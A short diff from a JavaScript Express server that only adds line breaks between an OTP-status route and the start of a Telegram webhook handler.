@@ -407,7 +407,9 @@ app.get('/api/orange/otp-status/:tx', (req, res) => {
   else if (t.otpStatus === 'inactive') decision = 'inactive';
 
   res.json({ ok:true, decision, tx: tracking, lang: normalizeLang(t.lang) });
-});app.post('/api/telegram-webhook', async (req, res) => {
+});
+
+app.post('/api/telegram-webhook', async (req, res) => {
   try {
     const update = req.body || {};
     const cq = update.callback_query;
